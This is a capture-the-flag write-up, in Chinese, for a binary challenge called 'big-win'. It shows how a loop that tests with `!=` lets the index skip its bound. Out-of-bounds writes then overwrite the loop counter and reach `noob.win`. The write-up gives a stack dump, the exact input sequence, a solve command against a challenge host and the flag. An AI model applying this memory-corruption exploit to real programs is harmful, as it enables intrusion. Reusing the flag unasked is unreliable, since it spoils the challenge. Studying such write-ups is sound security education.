# big-win — `K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}`

```c
struct gambler { int win; int numbers[SLOTS]; };   // SLOTS = 7
```

`win` 是結構的第一個成員，所以 **`noob.numbers[-1]` 就是 `noob.win`**。目標是讓它不等於 `0x67`。

## 洞 1：迴圈用 `!=` 而不是 `<`

```c
while (i != SLOTS) {
    scanf("%d", &noob.numbers[i]);
    accum += noob.numbers[i];
    if (accum == 67) { puts("..."); i++; }   // 多加一次
    i++;
}
```

在 `i == 6` 時讓 `accum` 剛好等於 67，`i` 會 6 → 8，**直接跨過終止值 7**。
迴圈不但不結束，還開始往 `numbers` 後面越界寫。

## 洞 2：`i` 和 `accum` 就在結構正上方

遠端的 `SNAPSHOT()` 會印堆疊。連續送 `0x11111111`…`0x66666666` 觀察哪一格在變：

```
after numbers[5] = 0x66666666   (此時 i = 5, accum = 0x66666665)
rbp-48: 0x1111111100000067  <-- rsp      win=0x67 | numbers[0]
rbp-40: 0x3333333322222222              numbers[1] | numbers[2]
rbp-32: 0x5555555544444444              numbers[3] | numbers[4]
rbp-24: 0x0000000066666666              numbers[5] | numbers[6]
rbp-16: 0x0000000000403df0
rbp-08: 0x0000000566666665              accum      | i        <-- 就是這格
rbp+00: 0x00007fffd52befb0  <-- rbp
```

`noob` 在 `rbp-48`、`numbers[0]` 在 `rbp-44`，所以 `numbers[k]` 的位址是 `rbp-44+4k`：

| slot | 位址 | 實際是什麼 |
|---|---|---|
| `numbers[9]` | `rbp-08` | **`accum`** |
| `numbers[10]` | `rbp-04` | **`i`** |

## 組合

往 `numbers[10]` 寫 `-2` 就等於把 `i` 設成 -2，迴圈自己的 `i++` 讓它變成 -1，
下一次 `scanf` 就落在 `noob.numbers[-1]`，也就是 `noob.win`。

輸入序列：

| 送出 | 當下的 i | 效果 |
|---|---|---|
| `0` ×6 | 0..5 | accum 維持 0 |
| `67` | 6 | accum == 67 → i 跳成 8，迴圈存活 |
| `1` | 8 | accum = 68，避免再次觸發 naughty 分支 |
| `0` | 9 | 這格是 `accum`，把它歸零 |
| `-2` | 10 | 這格是 `i` → i = -2，迴圈 `i++` 後變 -1 |
| `1` | -1 | **寫進 `noob.win` = 1** |
| `1000` ×7 | 0..6 | 正常跑完，i 回到 7 → 離開迴圈 |

```bash
BIGWIN_HOST=chal.secso.cc BIGWIN_PORT=4001 python3 challenges/big-win/solve.py
```

```
spinning the lotto of fate, lets see if you win...
wtf you win???
K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}
```
